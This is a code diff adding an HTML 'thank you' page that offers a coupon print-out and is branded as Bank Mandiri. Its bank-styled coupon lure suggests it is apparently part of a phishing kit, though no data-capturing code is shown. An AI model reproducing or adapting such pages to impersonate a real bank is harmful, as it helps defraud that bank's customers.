@@ -1,0 +1,37 @@
+﻿<html>
+	<head>
+		<title>Cetak Kupon Sekarang</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<link rel="stylesheet" href="assets/common/css/global-3.css">
+		<link rel="stylesheet" href="assets/common/css/thank.css">
+		<link rel="stylesheet" href="assets/lib/loader/loader-3.css">
+		<link rel="stylesheet" href="assets/lib/ripple/ripple-3.css">
+		<script src="assets/lib/jquery/jquery-3.js"></script>
+		<script>
+			const module = {};
+		</script>
+		<script type="module" src="assets/common/js/thank.js"></script>
+	</head>
+	<body>
+		<div style="width: 100%; height: 100%; background-color: #dee7ee; overflow: scroll; display: flex; flex-direction: column;">
+			<img src="assets/common/img/img5.jpg" style="width: 100%; height: 65px; object-fit: fill;">
+			<div style="width: 100%; height: 2px; background-color: #013b78;"></div>
+			<img src="assets/common/img/img4.png" style="width: 100%; height: 250px; object-fit: cover; box-shadow: 0 5px 5px 2px rgba(0,0,0,.2); border-bottom: 2px solid #013b78; border-bottom-right-radius: 30px;">
+			<div style="width: calc(100% - 74px); margin-top: 30px; margin-left: 20px; margin-right: 20px; padding: 15px; text-align: center; color: #ffffff; background-color: #2367a5; border: 2px solid #ffffff; border-radius: 10px; text-shadow: 2px 2px 1px rgba(0,0,0,.8); font-size: 14px;">
+				<div id="text1" style="width: 100%; font-weight: bold;"></div>
+			</div>
+			<div style="position: fixed; left: 0; bottom: 0; width: 100%; height: 50px; display: flex; justify-content: center; align-items: center; background-color: #2468a5; color: #ffffff; font-size: 15px;">
+				© 2025 PT. Bank Mandiri (Persero) Tbk.
+			</div>
+			<div id="alert" style="position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; display: flex; justify-content: center; align-items: center;">
+				<img onclick="module.closeAlert()" src="assets/common/img/img6.jpg" style="width: calc(100% - 120px); height: 100px; object-fit: fill; border: 2px solid #013b78; border-radius: 30px;">
+			</div>
+			<audio id="success-audio" src="assets/common/audio/thank.mp3">
+			<div id="loader" style="display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; justify-content: center; align-items: center;">
+				<div style="width: calc(100% - 80px); margin-left: 40px; margin-right: 40px; height: 120px; background-color: #ffffff; border-radius: 5px; display: flex; justify-content: center; align-items: center;">
+					<div class="loader" style="width: 50px; height: 50px;"></div>
+				</div>
+			</div>
+		</audio></div>
+	</body>
+</html>
